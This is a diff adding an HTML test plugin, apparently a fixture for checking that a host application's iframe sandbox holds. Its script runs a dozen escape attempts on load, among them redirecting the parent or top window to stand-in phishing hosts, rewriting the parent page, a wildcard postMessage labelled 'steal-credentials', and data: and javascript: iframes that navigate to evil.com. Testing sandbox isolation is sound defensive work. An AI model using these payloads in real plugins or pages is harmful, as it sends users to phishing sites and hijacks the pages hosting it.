@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Iframe Escape Test Plugin</title>
+</head>
+<body>
+    <h1>Iframe Escape Attempts</h1>
+    <p>This plugin attempts various iframe escape techniques.</p>
+    
+    <script>
+        console.log('Starting iframe escape attempts...');
+        
+        // Attempt 1: Direct parent access
+        try {
+            parent.location.href = 'https://malicious.com/phishing';
+        } catch (e) {
+            console.log('Parent location access blocked');
+        }
+        
+        // Attempt 2: Top window access
+        try {
+            top.location = 'https://evil.com/redirect';
+        } catch (e) {
+            console.log('Top location access blocked');
+        }
+        
+        // Attempt 3: FrameElement manipulation
+        try {
+            if (window.frameElement) {
+                window.frameElement.src = 'https://malicious.com';
+                window.frameElement.style.width = '100vw';
+                window.frameElement.style.height = '100vh';
+                window.frameElement.style.position = 'absolute';
+                window.frameElement.style.top = '0';
+                window.frameElement.style.left = '0';
+                window.frameElement.style.zIndex = '9999';
+            }
+        } catch (e) {
+            console.log('FrameElement access blocked');
+        }
+        
+        // Attempt 4: Self parent manipulation
+        try {
+            self.parent.document.body.innerHTML = '<h1>Hacked!</h1>';
+        } catch (e) {
+            console.log('Self parent access blocked');
+        }
+        
+        // Attempt 5: Window navigation
+        try {
+            window.navigate('https://phishing-site.com');
+        } catch (e) {
+            console.log('Window navigate blocked');
+        }
+        
+        // Attempt 6: History manipulation
+        try {
+            history.pushState({}, 'Hacked', '/hacked');
+            parent.history.back();
+        } catch (e) {
+            console.log('History manipulation blocked');
+        }
+        
+        // Attempt 7: PostMessage without origin validation (dangerous)
+        parent.postMessage({
+            type: 'malicious',
+            payload: 'steal-credentials',
+            action: 'redirect',
+            url: 'https://attacker.com'
+        }, '*'); // Wildcard origin - very dangerous
+        
+        // Attempt 8: Nested iframe creation to bypass restrictions
+        const maliciousIframe = document.createElement('iframe');
+        maliciousIframe.src = 'javascript:parent.location="https://evil.com"';
+        maliciousIframe.style.display = 'none';
+        document.body.appendChild(maliciousIframe);
+        
+        // Attempt 9: Document domain manipulation
+        try {
+            document.domain = 'malicious.com';
+        } catch (e) {
+            console.log('Document domain manipulation blocked');
+        }
+        
+        // Attempt 10: Name collision attack
+        window.name = 'maliciousPayload';
+        
+        // Attempt 11: Focus stealing
+        window.focus();
+        if (parent && parent.focus) {
+            parent.focus();
+        }
+        
+        // Attempt 12: Custom sandbox attribute override attempt
+        const currentScript = document.currentScript;
+        if (currentScript && currentScript.parentNode) {
+            currentScript.parentNode.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-top-navigation');
+        }
+    </script>
+    
+    <!-- Define our own sandbox (should be prevented) -->
+    <iframe sandbox="allow-same-origin allow-scripts allow-top-navigation" 
+            src="data:text/html,<script>top.location='https://evil.com'</script>">
+    </iframe>
+</body>
+</html>
